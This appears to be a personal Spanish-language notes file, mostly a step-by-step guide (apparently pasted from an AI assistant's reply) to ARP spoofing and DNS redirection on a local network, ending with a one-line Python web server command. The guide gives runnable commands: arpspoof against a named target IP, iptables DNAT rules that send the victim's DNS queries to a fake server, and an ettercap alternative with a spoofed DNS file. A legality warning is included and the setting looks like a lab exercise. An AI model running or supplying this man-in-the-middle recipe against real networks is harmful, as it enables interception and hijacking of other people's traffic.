# Notas

## ARP Spoofing
Para redirigir el tráfico correctamente, habilita el reenvío de paquetes en tu máquina:

mira iptables y tablas arp
```
janrax@janrax-Legion-5-15ACH6H:~$ sudo iptables --flush
janrax@janrax-Legion-5-15ACH6H:~$ sudo iptables -S

arp -n
```




```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

```bash
sudo apt install dsniff

```

El ataque ARP spoofing engaña a un dispositivo para que asocie una dirección IP con una dirección MAC falsa. A continuación, te explico cómo puedes realizar un ARP spoofing en Kali Linux para engañar a la máquina en la red.

### **ADVERTENCIA**
El uso de técnicas de ARP spoofing es ilegal si no tienes permiso explícito para realizarlas. Realiza estos pasos únicamente en redes de prueba o con el consentimiento de los administradores de la red.

---

### **Pasos para Realizar ARP Spoofing**

#### 1. **Configurar IP Forwarding**
Para redirigir el tráfico correctamente, habilita el reenvío de paquetes en tu máquina:
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

#### 2. **Identificar las Direcciones IP y MAC**
- IP del objetivo: `192.168.1.67`
- Dirección IP falsa de DNS que quieres usar: `192.168.1.62`
- Dirección IP real del DNS (gateway): `192.168.1.1`

Verifica las direcciones IP y las MAC utilizando `arp-scan` o `nmap`:
```bash
sudo arp-scan --localnet
```

#### 3. **Instalar y Usar `arpspoof`**
El paquete `dsniff` incluye `arpspoof`. Si no lo tienes instalado, instálalo con:
```bash
sudo apt install dsniff
```

Luego, ejecuta `arpspoof` para engañar al objetivo:
```bash
sudo arpspoof -i eth0 -t 192.168.1.67 192.168.1.1
```
Esto hará que la máquina `192.168.1.67` piense que el gateway está asociado a tu dirección MAC.

#### 4. **Redirigir el Tráfico DNS**
Para redirigir el tráfico DNS al servidor falso (`192.168.1.62`), puedes usar `iptables` para redirigir las solicitudes DNS (puerto 53):
```bash
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 192.168.1.62
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
```

#### 5. **Comprobar la Redirección**
En la máquina de la víctima (`192.168.1.67`), verifica que el DNS esté siendo redirigido a `192.168.1.62`. Usa herramientas como:
```bash
nslookup example.com
```

Si todo está configurado correctamente, las solicitudes DNS desde la máquina víctima se resolverán en el servidor falso.

#### 6. **Desactivar ARP Spoofing y Limpiar las Reglas**
Cuando termines, detén `arpspoof` con `Ctrl + C` y limpia las reglas de `iptables`:
```bash
sudo iptables -t nat -F
sudo echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```

---

### **Opcional: Usar `ettercap` para ARP Spoofing**
Otra herramienta útil es `ettercap`, que incluye funciones integradas para ARP spoofing y DNS redirección.

1. **Ejecuta ettercap en modo texto:**
   ```bash
   sudo ettercap -T -i eth0 -M arp:remote /192.168.1.67/ /192.168.1.1/
   ```

2. **Configura un archivo de DNS spoofing**:
   Edita `/etc/ettercap/etter.dns` para incluir tus dominios personalizados.

---

Si necesitas ayuda con scripts o configuraciones avanzadas, ¡avísame!


## Arrancar servidor web local con python

```sh
sudo python3 -m http.server 80
```